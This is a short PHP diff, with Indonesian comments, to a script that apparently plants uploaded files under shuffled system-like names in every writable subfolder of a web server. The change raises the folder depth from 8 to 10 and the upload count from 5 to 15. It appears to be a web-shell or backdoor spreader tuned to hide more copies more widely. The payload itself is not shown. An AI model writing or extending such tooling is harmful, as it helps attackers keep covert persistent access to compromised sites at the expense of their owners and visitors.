@@ -150,7 +150,7 @@ function create_index_if_missing($dir, $content) {
  * Fungsi untuk mendapatkan semua subfolder secara otomatis,
  * hanya yang bisa ditulis.
  */
-function get_all_subfolders_writable($parent_dir, $max_depth = 8, $current_depth = 1) {
+function get_all_subfolders_writable($parent_dir, $max_depth = 10, $current_depth = 1) {
     $result = [];
     if ($current_depth > $max_depth) {
         return $result;
@@ -216,7 +216,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             shuffle($system_like_base_names);
 
             $upload_count = 0;
-            $max_uploads = 5;
+            $max_uploads = 15;
 
             $available_dirs = $all_writable_dirs;
             $available_names = $system_like_base_names;
